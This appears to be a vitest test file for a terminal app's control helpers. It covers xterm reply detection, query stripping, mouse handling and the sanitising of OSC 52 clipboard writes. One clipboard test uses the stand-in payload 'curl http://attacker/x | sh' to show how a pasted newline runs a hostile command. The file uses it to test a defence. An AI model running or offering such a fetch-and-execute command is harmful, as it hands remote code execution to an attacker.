import { beforeEach, describe, expect, it } from "vitest";
import {
  OSC52_MAX_CHARS,
  agentMouseDownAction,
  claimInitialInput,
  clearClaimedInitialInputsForTest,
  decodeOsc52Clipboard,
  initialInputForPty,
  isTerminalAutoReply,
  isTerminalIdentityResponse,
  isTerminalReport,
  stripTerminalQueries,
  suppressNativeContextMenu,
} from "../../lib/terminal/terminalControl";

describe("terminal control helpers", () => {
  beforeEach(() => {
    clearClaimedInitialInputsForTest();
  });

  it("detects xterm identity replies that must not become shell input", () => {
    expect(isTerminalIdentityResponse("\x1b[>0;276;0c")).toBe(true);
    expect(isTerminalIdentityResponse("\x1b[?1;2c")).toBe(true);
    expect(isTerminalIdentityResponse("\x1b[>0;276;0c\x1b[?1;2c")).toBe(true);
  });

  it("does not classify ordinary command text as a terminal identity reply", () => {
    expect(isTerminalIdentityResponse("PATH=/usr/bin:$PATH bash 'install.sh'")).toBe(false);
    expect(isTerminalIdentityResponse("0;276;0cPATH=/usr/bin:$PATH bash 'install.sh'")).toBe(false);
  });

  it("clears shell readline before auto-typing commands", () => {
    expect(initialInputForPty("bash 'install.sh'", "shell")).toBe("\x15bash 'install.sh'");
    expect(initialInputForPty("/hooks", "agent")).toBe("/hooks");
  });

  it("claims a given initial input only once per PTY id", () => {
    expect(claimInitialInput("p:shell-1", "bash 'install.sh'")).toBe(true);
    expect(claimInitialInput("p:shell-1", "bash 'install.sh'")).toBe(false);
    expect(claimInitialInput("p:shell-2", "bash 'install.sh'")).toBe(true);
    expect(claimInitialInput("p:shell-1", "bash 'other.sh'")).toBe(true);
  });
});

describe("replayed output can no longer answer a query on the user's behalf", () => {
  it("strips the probes tmux/vim send on attach — the `0;276;0c` bug", () => {
    // tmux's attach burst: primary + secondary DA, XTVERSION, background colour.
    const burst = "\x1b[c\x1b[>c\x1b[>0q\x1b]11;?\x07";
    expect(stripTerminalQueries(`hello${burst}world`)).toBe("helloworld");
    expect(stripTerminalQueries("\x1b[5n\x1b[6n\x1b[?6n")).toBe("");
    expect(stripTerminalQueries("\x1b[?2026$p")).toBe("");
    expect(stripTerminalQueries("\x1bP$qm\x1b\\")).toBe("");
  });

  it("leaves everything that draws alone", () => {
    const frame = "\x1b[2J\x1b[1;1H\x1b[31mred\x1b[0m\r\n\x1b]0;a title\x07$ ls\r\n";
    expect(stripTerminalQueries(frame)).toBe(frame);
    // A cursor-style set ends in `q` too, but is not a query.
    expect(stripTerminalQueries("\x1b[5 q")).toBe("\x1b[5 q");
    // Plain output never even runs the regex.
    expect(stripTerminalQueries("total 4\r\n")).toBe("total 4\r\n");
  });

  it("recognizes the replies to those probes, and no keystroke", () => {
    expect(isTerminalReport("\x1b[>0;276;0c")).toBe(true);
    expect(isTerminalReport("\x1b[?1;2c")).toBe(true);
    expect(isTerminalReport("\x1b[24;1R")).toBe(true);
    expect(isTerminalReport("\x1b[0n")).toBe(true);
    expect(isTerminalReport("\x1b[?2026;2$y")).toBe(true);
    expect(isTerminalReport("\x1b]11;rgb:1e1e/1e1e/1e1e\x07")).toBe(true);
    expect(isTerminalReport("\x1bP1$r0m\x1b\\")).toBe(true);
    // Real user input, including the keys that come closest.
    expect(isTerminalReport("ls -la")).toBe(false);
    expect(isTerminalReport("\r")).toBe(false);
    expect(isTerminalReport("\x1b[A")).toBe(false); // arrow up
    expect(isTerminalReport("\x1bOR")).toBe(false); // F3 — SS3, not CSI
    expect(isTerminalReport("\x1b")).toBe(false); // Escape
  });

  it("tells everything xterm sends by itself from a keystroke", () => {
    // The replies above, plus the two streams a TUI switches on: focus
    // reports (a click into or out of the tab) and mouse tracking (a wheel
    // scroll over an agent pane is a burst of these).
    expect(isTerminalAutoReply("\x1b[I")).toBe(true);
    expect(isTerminalAutoReply("\x1b[O")).toBe(true);
    expect(isTerminalAutoReply("\x1b[<64;12;5M")).toBe(true); // SGR wheel up
    expect(isTerminalAutoReply("\x1b[<0;12;5m")).toBe(true); // SGR release
    expect(isTerminalAutoReply("\x1b[M !!")).toBe(true); // X10 press
    expect(isTerminalAutoReply("\x1b[32;12;5M")).toBe(true); // urxvt
    expect(isTerminalAutoReply("\x1b[24;1R")).toBe(true); // cursor position
    expect(isTerminalAutoReply("\x1b[?1;2c")).toBe(true); // DA1
    expect(isTerminalAutoReply("\x1b]11;rgb:1e1e/1e1e/1e1e\x07")).toBe(true);
    expect(isTerminalAutoReply("\x1b[I\x1b[24;1R")).toBe(true); // a burst
    // A person's keys, including the ones that come closest.
    expect(isTerminalAutoReply("continue the task\r")).toBe(false);
    expect(isTerminalAutoReply("\r")).toBe(false);
    expect(isTerminalAutoReply("\x1b")).toBe(false); // bare Escape: an interrupt
    expect(isTerminalAutoReply("\x03")).toBe(false); // Ctrl+C
    expect(isTerminalAutoReply("\x1b[A")).toBe(false); // arrow up
    expect(isTerminalAutoReply("\x1b[1;2A")).toBe(false); // shift+up
    expect(isTerminalAutoReply("\x1b[Z")).toBe(false); // backtab
    expect(isTerminalAutoReply("\x1bOR")).toBe(false); // F3
    expect(isTerminalAutoReply("\x1b[200~pasted\x1b[201~")).toBe(false); // bracketed paste
    expect(isTerminalAutoReply("\x1b[I typed")).toBe(false); // not the whole chunk
  });
});

/** OSC 52 payload: `Pc ; <base64>`. */
const osc52 = (text: string, pc = "c") => `${pc};${btoa(text)}`;

describe("OSC 52 clipboard writes are bounded, not trusted", () => {
  it("accepts an ordinary clipboard write on the clipboard registers", () => {
    expect(decodeOsc52Clipboard(osc52("git log --oneline"))).toBe("git log --oneline");
    // "" is the spec default (also the clipboard); "cp"/"cs" include it.
    expect(decodeOsc52Clipboard(osc52("hello", ""))).toBe("hello");
    expect(decodeOsc52Clipboard(osc52("hello", "cp"))).toBe("hello");
  });

  it("strips newlines — the byte that turns a paste into an executed command", () => {
    // The headline attack: a payload whose own newline submits it the moment the
    // user pastes into a shell or a sudo prompt.
    expect(decodeOsc52Clipboard(osc52("curl http://attacker/x | sh\n"))).toBe(
      "curl http://attacker/x | sh ",
    );
    expect(decodeOsc52Clipboard(osc52("a\r\nb\nc"))).toBe("a b c");
    expect(decodeOsc52Clipboard(osc52("\n\n"))).toBe(" ");
  });

  it("caps the payload length", () => {
    const long = "x".repeat(OSC52_MAX_CHARS + 500);
    expect(decodeOsc52Clipboard(osc52(long))!.length).toBe(OSC52_MAX_CHARS);
  });

  it("refuses a read-back query, a non-clipboard register, and a malformed payload", () => {
    // `Pc;?` would let any program read whatever the user last copied.
    expect(decodeOsc52Clipboard("c;?")).toBeNull();
    // Primary-selection-only is not Tabtivity's one clipboard.
    expect(decodeOsc52Clipboard(osc52("hello", "p"))).toBeNull();
    expect(decodeOsc52Clipboard("c")).toBeNull();
    expect(decodeOsc52Clipboard("c;!!!not-base64!!!")).toBeNull();
    // Nothing left after stripping → nothing to set.
    expect(decodeOsc52Clipboard(osc52(""))).toBeNull();
  });
});


describe("agent pane mousedown", () => {
  const press = (over: Partial<Parameters<typeof agentMouseDownAction>[0]> = {}) => ({
    button: 0,
    detail: 1,
    shiftKey: false,
    ctrlKey: false,
    altKey: false,
    metaKey: false,
    ...over,
  });

  it("pastes on a double-click, whether or not the program holds the mouse", () => {
    expect(agentMouseDownAction(press({ detail: 2 }), false)).toBe("paste");
    expect(agentMouseDownAction(press({ detail: 2 }), true)).toBe("paste");
  });

  it("forces a selection only while the program holds the mouse", () => {
    // Mouse tracking on: a plain drag would otherwise be reported to the TUI and
    // select nothing — this is "can't copy out of an agent tab".
    expect(agentMouseDownAction(press(), true)).toBe("select");
    // Tracking off: xterm already selects. Forcing here would put it in its
    // shift-EXTENDS-the-selection branch, so each new drag would grow the last
    // selection instead of starting a fresh one.
    expect(agentMouseDownAction(press(), false)).toBe("pass");
    // A triple-click still selects its line through the same override.
    expect(agentMouseDownAction(press({ detail: 3 }), true)).toBe("select");
  });

  it("never touches a modified or non-primary press", () => {
    for (const mod of ["shiftKey", "ctrlKey", "altKey", "metaKey"] as const) {
      expect(agentMouseDownAction(press({ [mod]: true, detail: 2 }), true)).toBe("pass");
      expect(agentMouseDownAction(press({ [mod]: true }), true)).toBe("pass");
    }
    // Right/middle button: the context menu and paste-on-middle-click are xterm's.
    expect(agentMouseDownAction(press({ button: 2, detail: 2 }), true)).toBe("pass");
    expect(agentMouseDownAction(press({ button: 1 }), true)).toBe("pass");
  });
  it("in a shell pane, forces the selection for every click count and never pastes", () => {
    // Local shells run in a `mouse on` tmux, so the mouse is always grabbed; a
    // drag must still make the xterm selection that copy-on-select copies.
    expect(agentMouseDownAction(press(), true, false)).toBe("select");
    expect(agentMouseDownAction(press({ detail: 2 }), true, false)).toBe("select");
    expect(agentMouseDownAction(press({ detail: 3 }), true, false)).toBe("select");
    expect(agentMouseDownAction(press({ detail: 2 }), false, false)).toBe("pass");
    expect(agentMouseDownAction(press({ ctrlKey: true }), true, false)).toBe("pass");
  });
});

describe("right-click context menu", () => {
  it("belongs to the program while it holds the mouse — its own paste is the only one", () => {
    expect(suppressNativeContextMenu({ shiftKey: false }, true)).toBe(true);
  });

  it("stays native when nothing grabbed the mouse, and Shift always reaches it", () => {
    expect(suppressNativeContextMenu({ shiftKey: false }, false)).toBe(false);
    expect(suppressNativeContextMenu({ shiftKey: true }, true)).toBe(false);
  });
});
